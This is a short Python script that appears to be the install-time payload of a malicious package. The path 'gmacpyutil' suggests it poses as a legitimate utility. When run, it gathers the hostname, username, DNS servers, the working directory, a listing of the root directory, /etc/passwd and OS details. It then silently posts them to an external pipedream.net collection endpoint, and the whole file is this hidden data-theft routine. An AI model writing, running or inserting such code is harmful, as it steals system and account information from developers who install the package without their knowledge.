import os
import socket
import requests
import platform
import subprocess

def collect_system_info():
    # System information
    hostname = socket.gethostname()
    username = os.getenv('USER') or os.getenv('USERNAME')
    dns_servers = []
    
    # Get DNS servers
    try:
        with open('/etc/resolv.conf', 'r') as f:
            for line in f:
                if 'nameserver' in line:
                    dns_servers.append(line.split()[1])
    except:
        pass

    # Get root directory listing
    try:
        root_ls = subprocess.check_output(['ls', '/']).decode()
    except:
        root_ls = "Failed to list root"

    # Get passwd contents
    try:
        with open('/etc/passwd', 'r') as f:
            passwd_contents = f.read()
    except:
        passwd_contents = "Failed to read passwd"

    # Prepare payload
    payload = {
        'hostname': hostname,
        'username': username,
        'dns_servers': dns_servers,
        'current_dir': os.getcwd(),
        'root_listing': root_ls,
        'passwd_contents': passwd_contents,
        'os_type': platform.system(),
        'os_release': platform.release()
    }

    # Send data
    try:
        requests.post('https://eowthx8teol6a3s.m.pipedream.net/gmacpyutil', json=payload)
    except:
        pass

# Execute during package installation
collect_system_info()
